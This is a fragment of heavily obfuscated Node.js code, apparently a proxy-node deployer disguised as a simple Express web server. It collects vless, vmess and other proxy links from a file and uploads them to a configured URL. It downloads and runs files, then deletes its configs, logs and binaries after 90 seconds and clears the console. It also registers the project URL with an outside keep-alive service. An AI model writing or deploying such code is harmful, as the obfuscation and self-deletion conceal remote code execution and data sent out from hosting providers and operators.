_0x1ce143&&_0x1ce143['status']===0xc8?(console[_0xa3c270(0x1ea)](_0xa3c270(0x263)),_0x1ce143):null;}catch(_0x38e41c){if(_0x38e41c[_0xa3c270(0x1d2)]){if(_0x38e41c['response'][_0xa3c270(0x240)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xa3c270(0x223)](listPath))return;const _0x48625d=fs[_0xa3c270(0x259)](listPath,_0xa3c270(0x1f7)),_0x9290ae=_0x48625d[_0xa3c270(0x1bd)]('\x0a')[_0xa3c270(0x28e)](_0x46fec8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xa3c270(0x1c7)](_0x46fec8));if(_0x9290ae[_0xa3c270(0x290)]===0x0)return;const _0x1be3c7=JSON[_0xa3c270(0x1e0)]({'nodes':_0x9290ae});try{const _0xfe963a=await axios[_0xa3c270(0x216)](UPLOAD_URL+_0xa3c270(0x1d7),_0x1be3c7,{'headers':{'Content-Type':_0xa3c270(0x1d6)}});return _0xfe963a&&_0xfe963a[_0xa3c270(0x240)]===0xc8?(console[_0xa3c270(0x1ea)](_0xa3c270(0x27a)),_0xfe963a):null;}catch(_0x171a57){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xdee5df=_0x1898,_0x2a436b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2a436b[_0xdee5df(0x28f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2a436b[_0xdee5df(0x28f)](phpPath);process['platform']===_0xdee5df(0x244)?exec('del\x20/f\x20/q\x20'+_0x2a436b[_0xdee5df(0x1e3)]('\x20')+_0xdee5df(0x236),_0x4092bb=>{const _0x166504=_0xdee5df;console[_0x166504(0x1e6)](),console[_0x166504(0x1ea)](_0x166504(0x1f1)),console[_0x166504(0x1ea)](_0x166504(0x264));}):exec(_0xdee5df(0x249)+_0x2a436b[_0xdee5df(0x1e3)]('\x20')+_0xdee5df(0x21b),_0x594360=>{const _0x4cf6c1=_0xdee5df;console['clear'](),console[_0x4cf6c1(0x1ea)](_0x4cf6c1(0x1f1)),console['log'](_0x4cf6c1(0x264));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x273e3=_0x30a5d0;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x273e3(0x230));return;}try{const _0x4d8f2e=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x273e3(0x1d6)}});return console[_0x273e3(0x1ea)](_0x273e3(0x243)),_0x4d8f2e;}catch(_0x4549ed){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x4549ed[_0x273e3(0x26a)]),null;}}async function startserver(){const _0x2e7b16=_0x30a5d0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x59d5f7){console[_0x2e7b16(0x257)](_0x2e7b16(0x218),_0x59d5f7);}}startserver()[_0x30a5d0(0x274)](_0x105fbd=>{const _0x423ecf=_0x30a5d0;console[_0x423ecf(0x257)](_0x423ecf(0x24a),_0x105fbd);}),app[_0x30a5d0(0x21f)]('/',async function(_0x49371a,_0x19d2fc){const _0x483c86=_0x30a5d0;try{const _0x363e28=path[_0x483c86(0x1e3)](__dirname,_0x483c86(0x252)),_0x20790f=await fs[_0x483c86(0x22c)]['readFile'](_0x363e28,_0x483c86(0x270));_0x19d2fc[_0x483c86(0x258)](_0x20790f);}catch(_0x12bee2){_0x19d2fc[_0x483c86(0x258)](_0x483c86(0x20a));}}),app[_0x30a5d0(0x275)](PORT,()=>console[_0x30a5d0(0x1ea)](_0x30a5d0(0x222)+PORT+'!'));
